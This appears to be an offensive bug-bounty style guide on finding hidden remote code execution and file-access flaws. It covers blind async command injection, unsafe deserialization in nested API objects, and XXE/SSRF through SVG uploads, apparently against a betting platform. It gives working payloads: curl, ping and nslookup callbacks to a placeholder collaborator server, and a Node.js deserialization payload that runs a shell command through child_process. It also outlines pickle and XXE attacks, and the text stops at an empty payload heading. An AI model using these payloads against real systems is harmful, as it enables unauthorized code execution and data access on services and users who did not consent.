## 🛠️ The Overlooked RCE & File Exploitation Channels
Standard scanners catch explicit file uploads or basic text-field command injections. A million researchers have fuzzed the User-Agent and common entry forms. To find a hidden RCE or Local File Access vulnerability, you must exploit background processing engines and serialized data streams.

       [ Malicious JSON/Object Payload ]
                       │
                       ▼
         [ Edge Gateway / CDN Proxy ] ──(Passed as trusted internal communication)
                       │
                       ▼
      [ Internal Microservice Layer ] ──(Unsafe JSON/YAML/Binary Deserialization)
                       │
                       ▼
       [ Underlying Host Operating System ] ──(Remote Code Execution)

## Blind Async Command Injection
Developers strip out special characters on instant HTTP responses. However, they frequently pass variables directly to shell scripts inside background jobs that run asynchronously.

* Where It Is Hidden: Inside profiling features, custom voucher generation exports, or third-party identity verification uploads (OCR text parsing).
* The Technique: Intercept the profile name update request. Instead of using standard payloads, inject commands designed to trigger an out-of-band network callback hours later when administrative scripts aggregate user records.
* Payloads:
* `curl http://YOUR_COLLABORATOR_SERVER`
   * $(ping -c 3 YOUR_COLLABORATOR_SERVER)
   * ||nslookup+YOUR_COLLABORATOR_SERVER||

## Unsafe Deserialization in Nested API Objects
When interacting with complex endpoints (such as saving custom bet configurations or preferences), applications often accept binary formats, JSON, or YAML objects and convert them back into internal server code logic.

* Where It Is Hidden: Deeply nested, undocumented options parameters within internal APIs (/api/v1/user/config/set).
* The Technique: Identify the programming language running the service by triggering stack traces via malformed inputs. Send language-specific objects that instantiate arbitrary classes when deserialized.
* Payloads:
* Node.js (Unsafe Eval): {"_id":"_$$ND_FUNC$$_function (){require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });}()"}
   * Python (Pickle Injection inside base64 configurations): Craft a serialized payload using Python’s pickle library that calls an OS system command upon loading.

## Blind XXE / SSRF inside Server-Side Document Processing
If the platform permits uploading avatar images, betting receipts, or verification files, the underlying parsing library might process external entities or network configurations by default.

* Where It Is Hidden: SVG file uploads for avatar photos or custom profile templates.
* The Technique: Modify a valid SVG image manually to embed XML external entities. Upload the file and check if the host server initiates a background network query or prints structural system paths.
* Payloads:

